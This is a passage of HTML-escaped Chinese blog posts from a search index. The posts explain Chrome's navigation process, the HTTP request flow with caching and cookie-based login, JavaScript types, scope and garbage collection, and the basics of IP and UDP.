&lt;p&gt;因为渲染进程所有的内容都是通过⽹络获取的，会存在⼀些恶意代码利⽤浏览器漏洞对系统进⾏攻 击，所以运⾏在渲染进程⾥⾯的代码是不被信任的。这也是为什么Chrome会让渲染进程运⾏在安全沙箱 ⾥，就是为了保证系统的安全。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;p&gt;这个过程可以⼤致描述为如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;⾸先，⽤⼾从浏览器进程⾥输⼊请求信息；&lt;/li&gt;
&lt;li&gt;然后，⽹络进程发起URL请求；&lt;/li&gt;
&lt;li&gt;服务器响应URL请求之后，浏览器进程就⼜要开始准备渲染进程了；&lt;/li&gt;
&lt;li&gt;渲染进程准备好之后，需要先向渲染进程提交⻚⾯数据，我们称之为提交⽂档阶段；&lt;/li&gt;
&lt;li&gt;渲染进程接收完⽂档信息之后，便开始解析⻚⾯和加载⼦资源，完成⻚⾯的渲染&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;从输入url到面展示&#34;&gt;从输⼊URL到⻚⾯展⽰&lt;/h2&gt;
&lt;h3 id=&#34;用戶输入&#34;&gt;⽤⼾输⼊&lt;/h3&gt;
&lt;p&gt;当⽤⼾在地址栏中输⼊⼀个查询关键字时，地址栏会判断输⼊的关键字是&lt;strong&gt;搜索内容&lt;/strong&gt;，还是&lt;strong&gt;请求的URL&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果是搜索内容，地址栏会使⽤浏览器默认的搜索引擎，来合成新的带搜索关键字的URL。&lt;/li&gt;
&lt;li&gt;如果判断输⼊内容符合URL规则，那么地址栏会根据规则，把这段内容加上协议，合成为完整的URL。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;p&gt;例如输入&lt;strong&gt;画画&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1627880388812.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;p&gt;输入不带协议的网址 例如  &lt;strong&gt;fanfankill.github.io&lt;/strong&gt;  会自动加上&lt;strong&gt;https:😕/&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;url请求过程&#34;&gt;URL请求过程&lt;/h3&gt;
&lt;p&gt;浏览器进程会通过进程间通信（IPC）把URL请求发送⾄⽹络 进程，⽹络进程接收到URL请求后，会在这⾥发起真正的URL请求流程。&lt;/p&gt;
&lt;p&gt;⾸先，⽹络进程会查找本地缓存是否缓存了该资源。如果有缓存资源，那么直接返回资源给浏览器进程；如 果在缓存中没有查找到资源，那么直接进⼊⽹络请求流程。&lt;/p&gt;
&lt;p&gt;这请求前的第⼀步是要进⾏&lt;strong&gt;DNS解析&lt;/strong&gt;，以获取请 求域名的服务器IP地址。如果请求协议是HTTPS，那么还需要建⽴TLS连接。&lt;/p&gt;
&lt;p&gt;接下来就是利⽤IP地址和服务器建⽴TCP连接。连接建⽴之后，浏览器端会构建请求⾏、请求头等信息，并 把和该域名相关的Cookie等数据附加到请求头中，然后向服务器发送构建的请求信息。&lt;/p&gt;
&lt;p&gt;服务器接收到请求信息后，会根据请求信息⽣成响应数据（包括响应⾏、响应头和响应体等信息），并发给 ⽹络进程。等⽹络进程接收了响应⾏和响应头之后，就开始解析响应头的内容了。&lt;/p&gt;
&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;重定向&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在接收到服务器返回的响应头后，⽹络进程开始解析响应头，如果发现返回的状态码是301或者302，那么 说明服务器需要浏览器重定向到其他URL。这时⽹络进程会从响应头的Location字段⾥⾯读取重定向的地 址，然后再发起新的HTTP或者HTTPS请求，⼀切⼜重头开始了。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;响应数据类型处理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Type是HTTP头中⼀个⾮常重要的字段， 它告诉浏览器服务器返回的响应 体数据是什么类型&lt;/strong&gt;，然后浏览器会根据Content-Type的值来决定如何显⽰响应体的内容。例如  text/html 是HTML格式， application/octet-stream  是&lt;strong&gt;字节流类型&lt;/strong&gt;，通常情况下，浏览器会按照&lt;strong&gt;下载类型&lt;/strong&gt;处理&lt;/p&gt;
&lt;p&gt;如果Content-Type字段的值被浏览器判断为下载类型，那么该请求会被提交给浏览器的下载管理器，同时该URL请求的导航流程就此结束。但如果是HTML， 那么浏览器则会继续进⾏导航流程。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;准备渲染进程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;默认情况下，Chrome会为每个⻚⾯分配⼀个渲染进程，每打开⼀个新⻚⾯就会配套创建⼀个新的渲染进程。在某些情况下，浏览器会让多个⻚⾯直接运⾏在同⼀个渲染进程中。&lt;/p&gt;
&lt;h4 id=&#34;那什么情况下多个面会同时运行在一个渲染进程中呢&#34;&gt;那什么情况下多个⻚⾯会同时运⾏在⼀个渲染进程中呢？&lt;/h4&gt;
&lt;p&gt;我们将“&lt;strong&gt;同⼀站点&lt;/strong&gt;”定 义为&lt;strong&gt;根域名&lt;/strong&gt;（例如 fanfankill.github.io）加上&lt;strong&gt;协议&lt;/strong&gt;（例如，https:// 或者http://），还包含了该根域名下的所有 ⼦域名和不同的端⼝&lt;/p&gt;
&lt;p&gt;它们都是属于同⼀站点，因为它们的协议都是HTTPS，⽽且根域名也都是fanfankill.github.io。&lt;/p&gt;
&lt;p&gt;但&lt;strong&gt;如果从⼀个⻚⾯打开了另⼀个新⻚⾯，⽽新⻚⾯和 当前⻚⾯属于同⼀站点的话，那么新⻚⾯会复⽤⽗⻚⾯的渲染进程&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;总结来说，打开⼀个新⻚⾯采⽤的&lt;strong&gt;渲染进程&lt;/strong&gt;策略就是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通常情况下，打开新的⻚⾯都会使⽤单独的渲染进程；&lt;/li&gt;
&lt;li&gt;如果从A⻚⾯打开B⻚⾯，且A和B都属于同⼀站点的话，那么B⻚⾯复⽤A⻚⾯的渲染进程；如果是其他情 况，浏览器进程则会为B创建⼀个新的渲染进程。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;提交文档&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这⾥的“⽂档”是指URL请求的响应体数据&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;“提交⽂档”的消息是由浏览器进程发出的，渲染进程接收到“提交⽂档”的消息后，会和⽹络进程建⽴ 传输数据的“&lt;strong&gt;管道&lt;/strong&gt;”。&lt;/li&gt;
&lt;li&gt;等⽂档数据传输完成之后，渲染进程会返回“确认提交”的消息给浏览器进程。&lt;/li&gt;
&lt;li&gt;浏览器进程在收到“确认提交”的消息后，会更新浏览器界⾯状态，包括了安全状态、地址栏的URL、前 进后退的历史状态，并更新Web⻚⾯。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;p&gt;这也就解释了为什么在浏览器的地址栏⾥⾯输⼊了⼀个地址后，之前的⻚⾯没有⽴⻢消失，⽽是要加载⼀会 ⼉才会更新⻚⾯。&lt;/p&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;渲染阶段&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;⼀旦⽂档被提交，渲染进程便开始⻚⾯解析和⼦资源加载了&lt;/p&gt;
&lt;p&gt;⼀旦⻚⾯⽣成完成，渲染进程会发送⼀个消息给浏览器进程，浏览器接 收到消息后，会停⽌标签图标上的加载动画。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1627880395764.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">从输⼊URL到⻚⾯展⽰，这中间发⽣了什么？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/http-qing-qiu-liu-cheng-wei-shi-me-hen-duo-zhan-dian-di-ci-da-kai-su-du-hui-hen-kuai/"" data-c="
          &lt;p&gt;HTTP协议，正是建⽴在TCP连接基础之上的。&lt;strong&gt;HTTP是⼀种允许浏览器向服务器获取资源的协议，是 Web的基础&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HTTP也是浏览器使⽤最⼴的协议&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;输入一个url会发生什么？&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;构建请求&#34;&gt;构建请求&lt;/h2&gt;
&lt;p&gt;⾸先，浏览器构建&lt;strong&gt;请求⾏&lt;/strong&gt;信息，如下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GET /index.html HTTP1.1&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;查找缓存&#34;&gt;查找缓存&lt;/h2&gt;
&lt;p&gt;在真正发起⽹络请求之前，浏览器会先在浏览器缓存中查询是否有要请求的⽂件。其中，&lt;strong&gt;浏览器缓存是⼀种 在本地保存资源副本，以供下次请求时直接使⽤的技术&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;当浏览器发现请求的资源已经在浏览器缓存中存有副本，它会&lt;strong&gt;拦截请求&lt;/strong&gt;，返回该资源的副本。这样做的好处有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;缓解服务器端压⼒，提升性能（获取资源的耗时更短了）；&lt;/li&gt;
&lt;li&gt;对于⽹站来说，缓存是实现快速资源加载的重要组成部分。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然，如果缓存查找失败，就会进⼊⽹络请求过程了。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;准备ip地址和端口&#34;&gt;准备IP地址和端⼝&lt;/h2&gt;
&lt;p&gt;HTTP和TCP的关系&lt;/p&gt;
&lt;p&gt;浏览器使⽤HTTP协议作为 &lt;strong&gt;应⽤层协议&lt;/strong&gt;，⽤来封装请求的⽂本信息；并使⽤&lt;strong&gt;TCP/IP作传输层协议&lt;/strong&gt;将它发到⽹络上&lt;/p&gt;
&lt;p&gt;在HTTP⼯作开 始之前，浏览器需要通过TCP与服务器建⽴连接。也就是说&lt;strong&gt;HTTP的内容是通过TCP的传输数据阶段来实现的&lt;/strong&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1627811506470.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;HTTP⽹络请求的第⼀步是做什么呢？&lt;/p&gt;
&lt;p&gt;是和服务器建⽴TCP连接&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;那怎么获取IP地址和端⼝号呢？&lt;/p&gt;
&lt;p&gt;利⽤URL 地址来获取IP和端⼝信息&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;IP是 难以记忆，&lt;/p&gt;
&lt;p&gt;负责把域名和IP地址做⼀⼀映射关系。这套域名映射为IP的系统就叫 做“域名系统”，简称&lt;strong&gt;DNS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在第⼀步浏览器会请求DNS返回域名对应的IP&lt;/strong&gt;，当然浏览器还提供了 &lt;strong&gt;DNS数据缓存服务&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;如果某个域名已经解析过了，那么浏览器会缓存解析的结果，以供下次查询时直接使 ⽤，这样也会减少⼀次⽹络请求。&lt;/p&gt;
&lt;p&gt;拿到IP之后，接下来就需要获取端⼝号了。通常情况下，如果URL没有特别指明端⼝号，那么HTTP协议&lt;strong&gt;默认是80端⼝&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;等待tcp队列&#34;&gt;等待TCP队列&lt;/h2&gt;
&lt;p&gt;现在已经把端⼝和IP地址都准备好了，那么下⼀步是不是可以建⽴TCP连接了呢？&lt;/p&gt;
&lt;p&gt;答案依然是“不⾏”。Chrome有个机制，同⼀个域名同时最多只能建⽴6个TCP连接，如果在同⼀个域名下同时有10个请求发⽣，那么其中4个请求会进⼊排队等待状态，直⾄进⾏中的请求完成。&lt;/p&gt;
&lt;p&gt;当然，如果当前请求数量少于6，会直接进⼊下⼀步，建⽴TCP连接。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;建立tcp连接&#34;&gt;建⽴TCP连接&lt;/h2&gt;
&lt;p&gt;排队等待结束之后，终于可以快乐地和服务器握⼿了。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;发送http请求&#34;&gt;发送HTTP请求&lt;/h2&gt;
&lt;p&gt;⼀旦建⽴了TCP连接，浏览器就可以和服务器进⾏通信了。⽽HTTP中的数据正是在这个通信过程中传输 的。&lt;/p&gt;
&lt;p&gt;⾸先浏览器会向服务器发送请求⾏，它包括了&lt;strong&gt;请求⽅法、请求URI（Uniform Resource Identifier）和 HTTP版本协议&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在浏览器发送请求⾏命令之后，还要以&lt;strong&gt;请求头&lt;/strong&gt;形式发送其他⼀些信息，⽐如包含了浏览器所使⽤的操作系统、浏览器内核等信息，以及当前请求的域名信息、浏览器端的 Cookie信息，等等。&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1627812653198.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;服务端处理http请求流程&#34;&gt;服务端处理HTTP请求流程&lt;/h2&gt;
&lt;p&gt;历经千⾟万苦，HTTP的请求信息终于被送达了服务器。接下来，服务器会根据浏览器的请求信息来准备相 应的内容。&lt;/p&gt;
&lt;h3 id=&#34;返回请求&#34;&gt;返回请求&lt;/h3&gt;
&lt;p&gt;⼀旦服务器处理结束，便可以返回数据给浏览器了。&lt;/p&gt;
&lt;p&gt;返回响应⾏、响应头和响应体的数据&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1627812730509.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;⾸先服务器会返回&lt;strong&gt;响应⾏&lt;/strong&gt;，包括协议版本和状态码。&lt;/p&gt;
&lt;p&gt;服务器会 通过请求⾏的状态码来告诉浏览器它的处理结果&lt;/p&gt;
&lt;p&gt;服务器也会随同响应向浏览器发送&lt;strong&gt;响应头&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;发送完响应头后，服务器就可以继续发送&lt;strong&gt;响应体&lt;/strong&gt;的数据&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;断开连接&#34;&gt;断开连接&lt;/h2&gt;
&lt;p&gt;⼀旦服务器向客⼾端返回了请求数据，它就要关闭 TCP 连接。不过如果浏览器或者服务器在 其头信息中加⼊了：&lt;code&gt;Connection:Keep-Alive&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;那么TCP连接在发送后将仍然保持打开状态，这样浏览器就可以继续通过同⼀个TCP连接发送请求。&lt;strong&gt;保持 TCP连接可以省去下次请求时需要建⽴连接的时间，提升资源加载速度&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;重定向&#34;&gt;重定向&lt;/h3&gt;
&lt;p&gt;⽐如当你在浏览器中打开geekbang.org 后，你会发现最终打开的⻚⾯地址是 https://www.geekbang.org。&lt;/p&gt;
&lt;p&gt;这两个URL之所以不⼀样，是因为涉及到了⼀个重定向操作。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1627811566799.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
状态301就是告诉浏览器，我需要重定向到另外⼀个⽹ 址，⽽需要重定向的⽹址正是包含在响应头的Location字段中，接下来，浏览器获取Location字段中的地 址，并使⽤该地址重新导航，这就是⼀个完整重定向的执⾏流程&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;所以为什么很多站点第二次打开速度会很快&#34;&gt;所以为什么很多站点第⼆次打开速度会很快？&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;DNS缓存&lt;/strong&gt;和&lt;strong&gt;⻚⾯资源缓存&lt;/strong&gt;这两块数据是 会被浏览器缓存的。&lt;/p&gt;
&lt;p&gt;DNS缓存⽐较简单，它主要就是在浏览器本地把对应的IP&lt;strong&gt;和域名关联起来&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;重点看下浏览器资源缓存&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1627811578305.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
当服务器返回HTTP响应头给浏览器时，浏览器是通过响应头中的&lt;strong&gt;Cache-Control&lt;/strong&gt;字段来设置是否缓存该资源。&lt;/p&gt;
&lt;p&gt;通过Cache-Control中的Max-age参数来设置缓存过期时间&lt;/p&gt;
&lt;p&gt;但如果缓存过期了，浏览器则会继续发起⽹络请求，并且在HTTP请求头中带上：&lt;code&gt;If-None-Match:&amp;quot;4f80f-13c-3a1xb12a&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;服务器收到请求头后，会根据If-None-Match的值来判断请求的资源是否有更新。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果没有更新，就返回304状态码，相当于服务器告诉浏览器：“这个缓存可以继续使⽤，这次就不重复 发送数据给你了。”&lt;/li&gt;
&lt;li&gt;如果资源有更新，服务器就直接返回最新资源给浏览器。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;登录状态是如何保持的&#34;&gt;登录状态是如何保持的？&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;⽤⼾打开登录⻚⾯，在登录框⾥填⼊⽤⼾名和密码，点击确定按钮&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;服务器接收到浏览器提交的信息校验之后，会⽣成⼀ 段表⽰⽤⼾⾝份的字符串，并把该字符串写到响应头的Set-Cookie字段⾥，如下所⽰，然后把响应头发送 给浏览器。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Set-Cookie: UID=3431uad;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;浏览器在接收到服务器的响应头后，开始解析响应头，如果遇到响应头⾥含有Set-Cookie字段的情况，浏 览器就会把这个字段信息保存到本地。⽐如把UID=3431uad保持到本地。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当⽤⼾再次访问时，浏览器会发起HTTP请求，但在发起请求之前，浏览器会读取之前保存的Cookie数 据，并把数据写进请求头⾥的Cookie字段⾥（如下所⽰），然后浏览器再将请求头发送给服务器。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;服务器在收到HTTP请求头数据之后，就会查找请求头⾥⾯的“Cookie”字段信息，当查找到包 含UID=3431uad的信息时，服务器查询后台，并判断该⽤⼾是已登录状态，然后⽣成含有该⽤⼾信息的 ⻚⾯数据，并把⽣成的数据发送给浏览器。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;浏览器在接收到该含有当前⽤⼾的⻚⾯数据后，就可以正确展⽰⽤⼾登录的状态信息了&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
">HTTP请求流程：为什么很多站点第⼆次打开速度会很快？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/zuo-yong-yu/"" data-c="
          &lt;h2 id=&#34;类型&#34;&gt;类型&lt;/h2&gt;
&lt;p&gt;ECMAScript 变量包含：基本类型值和引用类型值&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;基本类型值&lt;/strong&gt;指的是 简单的数据段，而&lt;strong&gt;引用类型值&lt;/strong&gt;指那些可能由多个值构成的对象。&lt;/p&gt;
&lt;p&gt;基本数据类型：Undefined、Null、Boolean、Number 和 String&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;动态属性&#34;&gt;动态属性&lt;/h3&gt;
&lt;p&gt;我们不能给基本类型的值添加属性&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var name = &amp;quot;Nicholas&amp;quot;; 
name.age = 27; 
alert(name.age); //undefined
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;复制变量值&#34;&gt;复制变量值&lt;/h3&gt;
&lt;p&gt;基本类型就是值复制&lt;/p&gt;
&lt;p&gt;当从一个变量向另一个变量复制引用类型的值时，同样也会将存储在变量对象中的值复制一份放到 为新变量分配的空间中。不同的是，这个值的副本实际上是一个指针，而这个指针指向存储在堆中的一 个对象。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;传递参数&#34;&gt;传递参数&lt;/h3&gt;
&lt;p&gt;为了证明对象是按&lt;strong&gt;值传递&lt;/strong&gt;的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function setName(obj) { 
 obj.name = &amp;quot;Nicholas&amp;quot;; 
 obj = new Object(); 
 obj.name = &amp;quot;Greg&amp;quot;; 
} 
var person = new Object(); 
setName(person); 
alert(person.name); //&amp;quot;Nicholas&amp;quot; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当在函数内部重写 obj 时，这 个变量引用的就是一个局部对象了。而这个局部对象会在函数执行完毕后立即被销毁。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;检查类型&#34;&gt;检查类型&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;typeof&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var s = &amp;quot;Nicholas&amp;quot;; 
var b = true; 
var i = 22; 
var u; 
var n = null; 
var o = new Object(); 
alert(typeof s); //string 
alert(typeof i); //number 
alert(typeof b); //boolean 
alert(typeof u); //undefined 
alert(typeof n); //object 
alert(typeof o); //object
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;instanceof&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;alert(person instanceof Object); // 变量 person 是 Object 吗？
alert(colors instanceof Array); // 变量 colors 是 Array 吗？
alert(pattern instanceof RegExp); // 变量 pattern 是 RegExp 吗？
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所有引用类型的值都是 Object 的实例。因此，在检测一个引用类型值和 Object 构造 函数时，instanceof 操作符始终会返回 true&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;执行环境及作用域&#34;&gt;执行环境及作用域&lt;/h2&gt;
&lt;p&gt;在 Web 浏览器中，全局执行环境被认为是 window 对象，因 此所有全局变量和函数都是作为 window 对象的属性和方法创建的。&lt;/p&gt;
&lt;p&gt;全局执行环境直到应用程序退 出——例如关闭网页或浏览器——时才会被销毁&lt;/p&gt;
&lt;p&gt;每个函数都有自己的&lt;strong&gt;执行环境&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;当代码在一个环境中执行时，会创建变量对象的一个&lt;strong&gt;作用域链&lt;/strong&gt;（scope chain）。作用域链的用途，是 保证对执行环境有权访问的所有变量和函数的有序访问。&lt;/p&gt;
&lt;p&gt;内部环境可以通过作用域链访问所有的外部环境，但 外部环境不能访问内部环境中的任何变量和函数&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;延长作用域链&#34;&gt;延长作用域链&lt;/h3&gt;
&lt;p&gt;然执行环境的类型总共只有两种——全局和局部（函数）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;try-catch 语句的 catch 块&lt;/li&gt;
&lt;li&gt;with 语句&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function buildUrl() { 
 var qs = &amp;quot;?debug=true&amp;quot;; 
 with(location){ 
 var url = location.href + qs; 
 } 
 return url; 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;with 语句接收的是 location 对象，因此其变量对象中就包含了 location 对象的所有属 性和方法，而这个变量对象被添加到了作用域链的前端&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;没有块级作用域&#34;&gt;没有块级作用域&lt;/h3&gt;
&lt;p&gt;由 for 语句创建的变量 i 即使在 for 循环执行结束后，也依旧会存在 于循环外部的执行环境中。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;声明变量&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用 var 声明的变量会自动被添加到最接近的环境中&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;查询标识符&lt;/p&gt;
&lt;p&gt;当在某个环境中为了读取或写入而引用一个标识符时，搜索过程从作用域链的前端开始，向上逐级查询与给定名字匹配的标识符。找到 了该标识符，搜索过程停止&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;垃圾收集&#34;&gt;垃圾收集&lt;/h2&gt;
&lt;p&gt;JavaScript 具有自动垃圾收集机制&lt;/p&gt;
&lt;p&gt;这种垃圾收集机制的原理其实很简单：找&lt;strong&gt;出那些不再继续使用的变 量，然后释放其占用的内存&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;为此，垃圾收集器会按照固定的时间间隔， 周期性地执行这一操作&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;标记清除&#34;&gt;标记清除&lt;/h3&gt;
&lt;p&gt;JavaScript 中最常用的垃圾收集方式是&lt;strong&gt;标记清除&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当变量进入环境时，就将这个变量标记为“进入环境”。&lt;/p&gt;
&lt;p&gt;而当变量离开环境时，则将其 标记为“离开环境”&lt;/p&gt;
&lt;p&gt;垃圾收集器在运行的时候会给存储在内存中的所有变量都加上标记。然后，它会去掉环境中的变量以及被环境中的变量引用的变量的标记。而在此之后再被加上标记 的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;引用计数&#34;&gt;引用计数&lt;/h3&gt;
&lt;p&gt;不太常见的垃圾收集策略&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;引用计数&lt;/strong&gt;的含义是跟踪记录每 个值被引用的次数&lt;/p&gt;
&lt;p&gt;当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是 1，如果同一个值又被赋给另一个变量，则该值的引用次数加 1。相反，如果包含对这个值引用的变量又取 得了另外一个值，则这个值的引用次数减 1。当这个值的引用次数变成 0 时，则说明没有办法再访问这 个值了，因而就可以将其占用的内存空间回收回来。&lt;/p&gt;
&lt;br&gt;
">作用域</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/tcp-xie-yi-ru-he-bao-zheng-jian-neng-bei-wan-zheng-song-da-liu-lan-qi/"" data-c="
          &lt;p&gt;衡量Web⻚⾯性能的时候有⼀个重要的指标叫“&lt;strong&gt;FP（First Paint）&lt;/strong&gt;”，是指从⻚⾯加载到⾸次开始绘制 的时⻓。影响FP指标其中⼀个重要的因素是⽹络加载速度。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;一个数据包的旅程&#34;&gt;⼀个数据包的“旅程”&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;IP：把数据包送达⽬的主机&lt;/p&gt;
&lt;p&gt;数据包要在互联⽹上进⾏传输，就要符合⽹际协议（Internet Protocol，简称IP）标准。你只需要知道⼀个家庭的具体 地址，就可以往这个地址发送包裹，这样物流系统就能把物品送到⽬的地。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;计算机的地址就称为IP地址，访问任何⽹站实际上只是你的计算机向另外⼀台计算机请求信息。&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;如果要想把⼀个数据包从主机A发送给主机B，那么在传输之前，数据包上会被附加上主机B的IP地址信息，这样在传输过程中才能正确寻址。额外地，数据包上还会附加上主机A本⾝的IP地址，有了这些信息主机B 才可以回复信息给主机A。&lt;/p&gt;
&lt;p&gt;附加的信息会被装进⼀个叫IP头的数据结构⾥。&lt;/p&gt;
&lt;p&gt;IP头是IP数据包开头的信 息，包含IP版本、源IP地址、⽬标IP地址、⽣存时间等信息。&lt;/p&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;UDP：把数据包送达应⽤程序&lt;/p&gt;
&lt;p&gt;IP是⾮常底层的协议，只负责把数据包传送到对⽅电脑，但是对⽅电脑并不知道把数据包交给哪个程序&lt;/p&gt;
&lt;p&gt;因此，需要基于IP之上开发能和应⽤打交道的协议，最常⻅的是“&lt;strong&gt;⽤⼾数据包协议&lt;/strong&gt;（User Datagram Protocol）”，简称&lt;strong&gt;UDP&lt;/strong&gt;。&lt;/p&gt;
